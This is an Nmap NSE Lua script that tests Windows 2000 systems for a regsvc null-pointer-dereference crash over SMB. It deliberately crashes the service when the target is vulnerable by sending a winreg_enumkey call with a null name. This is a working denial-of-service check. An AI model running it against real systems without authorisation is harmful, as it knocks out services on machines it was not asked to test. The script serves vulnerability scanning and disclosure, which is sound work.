local msrpc = require "msrpc"
local nmap = require "nmap"
local smb = require "smb"
local stdnse = require "stdnse"
local string = require "string"
local table = require "table"
local vulns = require "vulns"

description = [[
Checks if a Microsoft Windows 2000 system is vulnerable to a crash in regsvc caused by a null pointer 
dereference. This check will crash the service if it is vulnerable and requires a guest account or 
higher to work.

The vulnerability was discovered by Ron Bowes while working on <code>smb-enum-sessions</code> and 
was reported to Microsoft (Case #MSRC8742).

This check was previously part of smb-check-vulns.
]]
---
--@usage
-- nmap --script smb-vuln-regsvc-dos.nse -p445 <host>
-- nmap -sU --script smb-vuln-regsvc-dos.nse -p U:137,T:139 <host>
--
--@output
--| smb-vuln-regsvc-dos: 
--|   VULNERABLE:
--|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
--|     State: VULNERABLE
--|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference 
--|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes 
--|       while working on smb-enum-sessions.
--|_          
---

author = {"Ron Bowes", "Jiayi Ye", "Paulino Calderon <calderon()websec.mx>"}
copyright = "Ron Bowes"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"intrusive","exploit","dos","vuln"}
-- run after all smb-* scripts (so if it DOES crash something, it doesn't kill
-- other scans have had a chance to run)
dependencies = {
  "smb-brute", "smb-enum-sessions", "smb-security-mode",
  "smb-enum-shares", "smb-server-stats",
  "smb-enum-domains", "smb-enum-users", "smb-system-info",
  "smb-enum-groups", "smb-os-discovery", "smb-enum-processes",
  "smb-psexec",
};

hostrule = function(host)
  return smb.get_port(host) ~= nil
end

local VULNERABLE = 1
local PATCHED    = 2

---While writing <code>smb-enum-sessions</code> I discovered a repeatable null-pointer dereference
-- in regsvc. I reported it to Microsoft, but because it's a simple DoS (and barely even that, because
-- the service automatically restarts), and because it's only in Windows 2000, it isn't likely that they'll
-- fix it. This function checks for that crash (by crashing the process).
--
-- The crash occurs when the string sent to winreg_enumkey() function is null.
--
--@param host The host object.
--@return (status, result) If status is false, result is an error code; otherwise, result is either
--        <code>VULNERABLE</code> for vulnerable or <code>PATCHED</code> for not vulnerable. 
function check_winreg_Enum_crash(host)
  local i, j
  local elements = {}
  local status, bind_result, smbstate

  -- Create the SMB session
  status, smbstate = msrpc.start_smb(host, msrpc.WINREG_PATH)
  if(status == false) then
    return false, smbstate
  end

  -- Bind to WINREG service
  status, bind_result = msrpc.bind(smbstate, msrpc.WINREG_UUID, msrpc.WINREG_VERSION, nil)
  if(status == false) then
    msrpc.stop_smb(smbstate)
    return false, bind_result
  end

  local openhku_result
  status, openhku_result = msrpc.winreg_openhku(smbstate)
  if(status == false) then
    msrpc.stop_smb(smbstate)
    return false, openhku_result
  end

  -- Loop through the keys under HKEY_USERS and grab the names
  local enumkey_result
  status, enumkey_result = msrpc.winreg_enumkey(smbstate, openhku_result['handle'], 0, nil)
  msrpc.stop_smb(smbstate)

  if(status == false) then
    return true, VULNERABLE
  end
  return true, PATCHED
end

action = function(host)
  local status, result, message
  local response = {}
  local vuln_report = vulns.Report:new(SCRIPT_NAME, host)
  local vuln_table = {
    title = 'Service regsvc in Microsoft Windows systems vulnerable to denial of service',
    state = vulns.STATE.NOT_VULN,
    description = [[
The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference 
pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes 
while working on smb-enum-sessions.
    ]]
  }

  -- Check for a winreg_Enum crash
  status, result = check_winreg_Enum_crash(host)
  if(status == false) then
    vuln_table.state = vulns.STATE.NOT_VULN
  else
    if(result == VULNERABLE) then
      vuln_table.state = vulns.STATE.VULN
   else
      vuln_table.state = vulns.STATE.NOT_VULN
    end
  end
  return vuln_report:make_output(vuln_table)
end
